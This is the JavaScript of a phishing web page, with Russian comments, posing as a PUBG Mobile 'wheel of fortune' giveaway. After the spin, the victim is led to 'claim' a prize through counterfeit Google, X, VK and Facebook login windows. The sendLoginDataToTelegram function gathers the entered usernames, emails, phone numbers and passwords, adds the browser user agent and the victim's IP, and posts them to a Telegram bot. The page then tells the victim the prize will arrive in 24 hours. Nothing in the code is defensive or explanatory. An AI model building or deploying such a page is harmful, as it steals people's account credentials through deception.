        // Функции для модальных окон
        function openModal(modalId) {
            document.getElementById(modalId).classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('active');
            document.body.style.overflow = 'auto';
        }
        
        function openGoogleModal() {
            openModal('googleModalStep1');
        }
        
        function openXModal() {
            openModal('xModalStep1');
        }
        
        function switchGoogleAccount() {
            closeModal('googleModalStep2');
            openModal('googleModalStep1');
        }
        
        function switchXAccount() {
            closeModal('xModalStep2');
            openModal('xModalStep1');
        }
        
        // Функции для окна приза
        function openPrizeWindow() {
            const prizeWindow = document.getElementById('prizeWindow');
            prizeWindow.classList.add('active');
            document.body.style.overflow = 'hidden';
            
            if (userPrize) {
                document.getElementById('winImg').src = userPrize.image;
                document.getElementById('winName').textContent = `ПРИЗ #${userPrize.id}`;
                document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
                    "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
                    "Выберите социальную сеть для получения приза.";
                
                const collectBtn = document.getElementById('collectPrizeBtn');
                if (!isPrizeReceived) {
                    collectBtn.textContent = "ЗАБРАТЬ";
                    collectBtn.onclick = function() {
                        closePrizeWindow();
                        
                        // Сбрасываем выбор соцсети
                        socialOptions.forEach(opt => opt.classList.remove('selected'));
                        selectedSocial = null;
                        
                        // Показываем форму выбора соцсети
                        socialSelectSection.classList.add('active');
                        socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                        
                        showNotification("Выберите социальную сеть для получения приза");
                    };
                } else {
                    collectBtn.textContent = "ЗАКРЫТЬ";
                    collectBtn.onclick = function() {
                        closePrizeWindow();
                    };
                }
            } else {
                document.getElementById('winImg').src = '';
                document.getElementById('winName').textContent = "ПОЧТА ПУСТА";
                document.getElementById('prizeDescription').textContent = "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!";
                
                const collectBtn = document.getElementById('collectPrizeBtn');
                collectBtn.textContent = "ЗАКРЫТЬ";
                collectBtn.onclick = function() {
                    closePrizeWindow();
                };
            }
        }
        
        function closePrizeWindow() {
            document.getElementById('prizeWindow').classList.remove('active');
            document.body.style.overflow = 'auto';
        }
        
        function updatePrizeBadge() {
            const badge = document.getElementById('prizeBadge');
            const mailBtn = document.getElementById('prizeMailBtn');
            
            if (userPrize && !isPrizeReceived) {
                badge.textContent = '1';
                badge.style.display = 'flex';
                badge.style.background = '#ff4444';
                mailBtn.disabled = false;
                // Включаем анимацию пульсации
                badge.style.animation = 'pulse 1.5s infinite';
            } else if (userPrize && isPrizeReceived) {
                badge.textContent = '1';
                badge.style.display = 'flex';
                badge.style.background = '#4CAF50';
                mailBtn.disabled = false;
                badge.style.animation = 'none';
            } else {
                badge.textContent = '0';
                badge.style.display = 'none';
                mailBtn.disabled = false;
                badge.style.animation = 'none';
            }
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const playBtn = document.getElementById('playBtn');
            const selectionFrame = document.getElementById('selectionFrame');
            const selectionIndicator = document.getElementById('selectionIndicator');
            const socialSelectSection = document.getElementById('socialSelectSection');
            const confirmationSection = document.getElementById('confirmationSection');
            const getPrizeBtn = document.getElementById('getPrizeBtn');
            const prizeItems = document.querySelectorAll('.prize-item');
            const languageBtn = document.getElementById('languageBtn');
            const languageDropdown = document.getElementById('languageDropdown');
            const notification = document.getElementById('notification');
            const spinSound = document.getElementById('spinSound');
            const winSound = document.getElementById('winSound');
            const socialOptions = document.querySelectorAll('.social-option');
            const prizeMailBtn = document.getElementById('prizeMailBtn');
            const collectPrizeBtn = document.getElementById('collectPrizeBtn');
            
            // Призы с картинками (без названий)
            const prizes = [
                { id: 1, image: "priz1.png" },
                { id: 2, image: "priz2.png" },
                { id: 3, image: "priz3.png" },
                { id: 4, image: "priz4.png" },
                { id: 5, image: "priz5.png" },
                { id: 6, image: "priz6.png" },
                { id: 7, image: "priz7.png" },
                { id: 8, image: "priz8.png" },
                { id: 9, image: "priz9.png" }
            ];
            
            let isSpinning = false;
            let currentPrizeIndex = 0;
            let spinInterval;
            let spinSpeed = 100;
            let spinCount = 0;
            const totalSpins = 30;
            let finalPrizeIndex = 0;
            let selectedSocial = null;
            let hasPlayed = false;
            
            // Порядок обхода призов
            const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
            
            // Языковые настройки
            const translations = {
                ru: {
                    play: "ИГРАТЬ",
                    title: "КОЛЕСО УДАЧИ PUBG",
                    subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
                    selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
                    selectText: "Выберите социальную сеть для получения приза",
                    getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
                    notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
                    notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                    notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
                    confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов."
                },
                en: {
                    play: "PLAY",
                    title: "PUBG WHEEL OF FORTUNE",
                    subtitle: "Try your luck and win exclusive prizes!",
                    selectTitle: "SELECT RECEIVING METHOD",
                    selectText: "Select social network to receive the prize",
                    getPrizeBtn: "GET PRIZE",
                    notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
                    notificationSelectSocial: "Please select a social network",
                    notificationAlreadyPlayed: "You have already used your attempt today!",
                    confirmationTitle: "APPLICATION ACCEPTED!",
                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
                    loginSuccess: "Login data sent! Prize will be credited within 24 hours."
                }
            };
            
            // Функция смены языка
            function changeLanguage(lang) {
                const t = translations[lang] || translations.ru;
                
                document.querySelector('.header h1').textContent = t.title;
                document.querySelector('.header p').textContent = t.subtitle;
                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                document.querySelector('#socialSelectSection p').textContent = t.selectText;
                getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
                document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                
                const langNames = {
                    ru: 'Русский', en: 'English', uz: "O'zbekcha",
                    kz: 'Қазақша', ar: 'العربية', zh: '中文',
                    ky: 'Кыргызча', dag: 'Дагестанский', che: 'Чеченский',
                    az: 'Azərbaycanca', hy: 'Հայերեն', jp: '日本語',
                    uk: 'Українська'
                };
                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
            }
            
            // Обработчики для меню языка
            languageBtn.addEventListener('click', function() {
                languageDropdown.classList.toggle('show');
            });
            
            document.querySelectorAll('.language-option').forEach(option => {
                option.addEventListener('click', function() {
                    const lang = this.getAttribute('data-lang');
                    changeLanguage(lang);
                    languageDropdown.classList.remove('show');
                    showNotification(`Язык изменен на ${this.textContent}`);
                });
            });
            
            // Функция показа уведомления
            function showNotification(message, isError = false, isSuccess = false) {
                notification.textContent = message;
                notification.classList.remove('error', 'success');
                
                if (isError) {
                    notification.classList.add('error');
                } else if (isSuccess) {
                    notification.classList.add('success');
                } else {
                    notification.style.background = 'linear-gradient(135deg, #2a3b5a, #1a2c42)';
                }
                
                notification.style.display = 'block';
                
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 5000);
            }
            
            // Функция получения случайного приза
            function getRandomPrize() {
                return Math.floor(Math.random() * prizes.length);
            }
            
            // Функция перемещения рамки
            function moveFrameToPrize(index) {
                const prizeItem = prizeItems[index];
                const rect = prizeItem.getBoundingClientRect();
                const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                
                selectionFrame.style.width = (rect.width + 16) + 'px';
                selectionFrame.style.height = (rect.height + 16) + 'px';
                selectionFrame.style.left = (rect.left - containerRect.left - 6) + 'px';
                selectionFrame.style.top = (rect.top - containerRect.top - 6) + 'px';
                selectionFrame.classList.add('active');
                
                // Позиционирование индикатора
                selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
                selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
            }
            
            // Функция показа/скрытия индикатора
            function showSelectionIndicator(show) {
                if (show) {
                    selectionIndicator.classList.add('show');
                    selectionIndicator.textContent = 'ВЫБРАНО';
                } else {
                    selectionIndicator.classList.remove('show');
                }
            }
            
            // Функция запуска рулетки
            function startRoulette() {
                if (isSpinning) return;
                
                if (hasPlayed) {
                    showNotification("Вы уже использовали свою попытку сегодня!", true);
                    return;
                }
                
                isSpinning = true;
                playBtn.disabled = true;
                socialSelectSection.classList.remove('active');
                confirmationSection.classList.remove('active');
                showSelectionIndicator(false);
                
                finalPrizeIndex = getRandomPrize();
                
                spinSound.currentTime = 0;
                spinSound.play();
                
                selectionFrame.style.opacity = '1';
                
                spinCount = 0;
                spinSpeed = 80; // Быстрее начальная скорость
                currentPrizeIndex = 0;
                
                spinInterval = setInterval(spinStep, spinSpeed);
            }
            
            function spinStep() {
                const prizeIndex = prizeOrder[currentPrizeIndex];
                moveFrameToPrize(prizeIndex);
                
                currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                spinCount++;
                
                // Замедление в конце
                if (spinCount > totalSpins * 0.7) {
                    spinSpeed += 15;
                    clearInterval(spinInterval);
                    spinInterval = setInterval(spinStep, spinSpeed);
                }
                
                if (spinCount >= totalSpins) {
                    clearInterval(spinInterval);
                    
                    spinSound.pause();
                    
                    winSound.currentTime = 0;
                    winSound.play();
                    
                    setTimeout(() => {
                        moveFrameToPrize(finalPrizeIndex);
                        showSelectionIndicator(true);
                        
                        setTimeout(() => {
                            isSpinning = false;
                            
                            // Сохраняем выигранный приз
                            userPrize = prizes[finalPrizeIndex];
                            isPrizeReceived = false;
                            
                            // Обновляем значок с анимацией
                            updatePrizeBadge();
                            
                            hasPlayed = true;
                            playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                            playBtn.disabled = false;
                            
                            // Сбрасываем выбор соцсети
                            socialOptions.forEach(opt => opt.classList.remove('selected'));
                            selectedSocial = null;
                            
                            // Показываем форму выбора соцсети
                            socialSelectSection.classList.add('active');
                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                            
                            showNotification(`🎉 Поздравляем! Вы выиграли приз!`, false, true);
                        }, 1000);
                    }, 300);
                }
            }
            
            // Обработчики выбора соцсети
            socialOptions.forEach(option => {
                option.addEventListener('click', function() {
                    socialOptions.forEach(opt => opt.classList.remove('selected'));
                    
                    this.classList.add('selected');
                    selectedSocial = this.getAttribute('data-social');
                });
            });
            
            // Обработчики форм входа
            
            // Twitter/X форма (этап 1: email/username)
            document.getElementById('xEmailForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                xUsername = this.querySelector('input').value;
                
                // Переходим к окну пароля
                closeModal('xModalStep1');
                openModal('xModalStep2');
            });
            
            // Twitter/X форма (этап 2: пароль)
            document.getElementById('xPasswordForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const password = this.querySelector('input').value;
                
                const loginData = {
                    username: xUsername,
                    password: password
                };
                
                const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
                
                if (success) {
                    closeModal('xModalStep2');
                    isPrizeReceived = true;
                    updatePrizeBadge();
                    showConfirmation();
                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                }
            });
            
            // ВКонтакте форма
            document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const inputs = this.querySelectorAll('input');
                const loginData = {
                    phone: inputs[0].value,
                    password: inputs[1].value,
                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
                };
                
                const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
                
                if (success) {
                    closeModal('vkModal');
                    isPrizeReceived = true;
                    updatePrizeBadge();
                    showConfirmation();
                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                }
            });
            
            // Facebook форма
            document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const inputs = this.querySelectorAll('input');
                const loginData = {
                    email: inputs[0].value,
                    password: inputs[1].value
                };
                
                const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
                
                if (success) {
                    closeModal('facebookModal');
                    isPrizeReceived = true;
                    updatePrizeBadge();
                    showConfirmation();
                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                }
            });
            
            // Google форма (этап 1: email)
            document.getElementById('googleEmailForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                googleEmail = this.querySelector('input').value;
                
                // Обновляем email в окне пароля
                document.getElementById('googleUserEmail').textContent = googleEmail;
                
                // Переходим к окну пароля
                closeModal('googleModalStep1');
                openModal('googleModalStep2');
            });
            
            // Google форма (этап 2: пароль)
            document.getElementById('googlePasswordForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const password = this.querySelector('input').value;
                const showPassword = document.getElementById('showPassword').checked;
                
                const loginData = {
                    email: googleEmail,
                    password: password,
                    show_password: showPassword ? 'Да' : 'Нет'
                };
                
                const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
                
                if (success) {
                    closeModal('googleModalStep2');
                    isPrizeReceived = true;
                    updatePrizeBadge();
                    showConfirmation();
                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                }
            });
            
            // Обработчик чекбокса "Показать пароль" для Google
            document.getElementById('showPassword').addEventListener('change', function() {
                const passwordInput = document.querySelector('.google-password-input');
                if (this.checked) {
                    passwordInput.type = 'text';
                } else {
                    passwordInput.type = 'password';
                }
            });
            
            // Обработчик кнопки получения приза
            getPrizeBtn.addEventListener('click', async function() {
                if (!selectedSocial) {
                    showNotification("Пожалуйста, выберите социальную сеть", true);
                    return;
                }
                
                // Открываем соответствующее модальное окно
                if (selectedSocial === 'google') {
                    openGoogleModal();
                } else if (selectedSocial === 'x') {
                    openXModal();
                } else if (selectedSocial === 'vk') {
                    openModal('vkModal');
                } else if (selectedSocial === 'facebook') {
                    openModal('facebookModal');
                }
            });
            
            // Функция показа подтверждения
            function showConfirmation() {
                socialSelectSection.classList.remove('active');
                confirmationSection.classList.add('active');
                confirmationSection.scrollIntoView({ behavior: 'smooth' });
            }
            
            // Функция отправки данных входа в Telegram
            async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
                const socialNames = {
                    'vk': 'ВКонтакте',
                    'facebook': 'Facebook',
                    'x': 'Twitter/X',
                    'google': 'Google'
                };
                
                const prizeNumber = prizeIndex + 1;
                
                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                
                // Добавляем данные в зависимости от соцсети
                if (socialType === 'vk') {
                    message += `📞 Телефон/email: ${loginData.phone || 'Не указано'}\n`;
                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                    message += `💻 Чужой компьютер: ${loginData.foreign_computer || 'Нет'}\n`;
                } else if (socialType === 'facebook') {
                    message += `📧 Email/телефон: ${loginData.email || 'Не указано'}\n`;
                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                } else if (socialType === 'x') {
                    message += `👤 Имя пользователя: ${loginData.username || 'Не указано'}\n`;
                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                } else if (socialType === 'google') {
                    message += `📧 Email: ${loginData.email || 'Не указано'}\n`;
                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                    message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                }
                
                message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                message += `🌐 User Agent: ${navigator.userAgent}\n`;
                message += `📍 IP: собирается...`;
                
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                try {
                    // Попробуем получить IP адрес
                    let ipAddress = 'Не определен';
                    try {
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResponse.json();
                        ipAddress = ipData.ip;
                    } catch (ipError) {
                        console.log('Не удалось получить IP:', ipError);
                    }
                    
                    // Заменяем IP в сообщении
                    const finalMessage = message.replace('собирается...', ipAddress);
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: finalMessage,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    console.log('Telegram response:', data);
                    
                    if (data.ok) {
                        return true;
                    } else {
                        console.error('Telegram error:', data);
                        return false;
                    }
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    return false;
                }
            }
            
            // Запуск рулетки
            playBtn.addEventListener('click', startRoulette);
            
            // Открытие окна с призом
            prizeMailBtn.addEventListener('click', openPrizeWindow);
            
            // Инициализация
            selectionFrame.style.opacity = '0';
            selectionIndicator.style.opacity = '0';
            updatePrizeBadge();
            
            // Закрытие окна приза при клике на кнопку "Закрыть"
            collectPrizeBtn.addEventListener('click', closePrizeWindow);
            
            // Закрытие окна приза при клике вне его
            document.getElementById('prizeWindow').addEventListener('click', function(e) {
                if (e.target === this) {
                    closePrizeWindow();
                }
            });
            
            // Предзагрузка изображений
            function preloadImages() {
                // Фон сайта
                const bg = new Image();
                bg.src = 'phon.png';
                
                // Призы
                for (let i = 1; i <= 9; i++) {
                    const img = new Image();
                    img.src = `priz${i}.png`;
                }
                
                // Иконки соцсетей
                const socialImages = [
                    'vkontakte.png',
                    'twiter.png',
                    'google.png'
                ];
                
                socialImages.forEach(src => {
                    const img = new Image();
                    img.src = src;
                });
            }
            
            preloadImages();
            
            // Закрытие выпадающего меню при клике вне его
            document.addEventListener('click', function(event) {
                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                    languageDropdown.classList.remove('show');
                }
            });
            
            // Закрытие модальных окон при клике вне их
            document.querySelectorAll('.modal-overlay').forEach(modal => {
                modal.addEventListener('click', function(e) {
                    if (e.target === this) {
                        this.classList.remove('active');
                        document.body.style.overflow = 'auto';
                    }
                });
            });
        });
    </script>
</body>
</html>
